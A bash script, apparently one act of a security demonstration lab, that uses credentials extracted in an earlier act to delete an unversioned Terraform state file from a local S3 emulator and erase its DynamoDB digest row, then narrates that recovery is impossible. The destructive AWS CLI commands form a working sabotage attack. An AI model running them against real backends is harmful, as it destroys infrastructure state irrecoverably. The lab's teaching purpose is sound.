#!/usr/bin/env bash
# Act 4 of the attack: state sabotage.
#
# Story: the attacker already has everything acts 1-3 gave them. The
# finishing move is against the backend itself: delete terraform.tfstate.
# The bucket the pipeline bootstrapped carries no versioning, so the delete
# is final and the shop runs on with no map and no way back.
#
# The script's FAIL lines are the story (the victims' view), narration
# only; it exits 0 because the sabotage itself succeeded. `make attack`
# must run act 1 first: this script uses the credentials that act extracted.
#
# Runs against the demo endpoint only (scripts/check/ports-and-secrets.sh
# enforces that).
set -euo pipefail
here="$(cd "$(dirname "$0")" && pwd)"
ENDPOINT=http://localhost:4566
BUCKET=acme-shop-tfstate
KEY=vulnerable/acme-shop.tfstate
CREDENV="$here/../act1/.stolen-creds.env"

fail() { echo "FAIL $*"; exit 1; }

echo "act 4: state sabotage"
echo
echo "1. the backend, as merged: an unversioned state bucket"
test -s "$CREDENV" || fail "no stolen credentials; run make attack first"
# shellcheck source=/dev/null
set -a
# shellcheck source=/dev/null
source "$CREDENV"
set +a
export AWS_REGION=us-east-1
aws --endpoint-url "$ENDPOINT" s3api head-object \
  --bucket "$BUCKET" --key "$KEY" >/dev/null 2>&1 \
  || fail "state object not found; run make bootstrap and make apply first"
aws --endpoint-url "$ENDPOINT" s3api get-bucket-versioning \
  --bucket "$BUCKET" --query 'Status' --output json 2>/dev/null \
  | grep -q Enabled \
  && fail "bucket is versioned; this act needs the unversioned bootstrap"
echo "OK  state object present, bucket has no versioning"

echo
echo "2. the attacker deletes the state object"
aws --endpoint-url "$ENDPOINT" s3api delete-object \
  --bucket "$BUCKET" --key "$KEY" >/dev/null
echo "OK  state object deleted ($BUCKET/$KEY)"
# tofu's S3 backend stores a state digest in the lock table and reads it
# on the next run; deleting the object without this row is what tofu's
# own error message names as the manual fix, so the sabotage erases both.
aws --endpoint-url "$ENDPOINT" dynamodb delete-item \
  --table-name acme-shop-tfstate-locks \
  --key '{"LockID":{"S":"acme-shop-tfstate/vulnerable/acme-shop.tfstate-md5"}}' >/dev/null
echo "OK  state digest deleted (acme-shop-tfstate-locks)"

echo
echo "3. blast radius"
if aws --endpoint-url "$ENDPOINT" s3api head-object \
     --bucket "$BUCKET" --key "$KEY" >/dev/null 2>&1; then
  fail "state object still present"
fi
echo "FAIL  the shop now runs with no map: state pull fails,"
echo "      nothing to plan against, no record of what was applied"

echo
echo "4. recovery attempt"
vers=$(aws --endpoint-url "$ENDPOINT" s3api list-object-versions \
  --bucket "$BUCKET" --prefix "${KEY%/*}/" --max-items 10 2>/dev/null)
if echo "$vers" | jq -e '.Versions or .DeleteMarkers' >/dev/null 2>&1; then
  fail "versions found; this act needs the unversioned bootstrap"
fi
echo "FAIL  unrecoverable: no versions to restore from"
echo "      a re-apply only collides with the orphans it no longer"
echo "      knows about; the remains stay unclaimed"
exit 0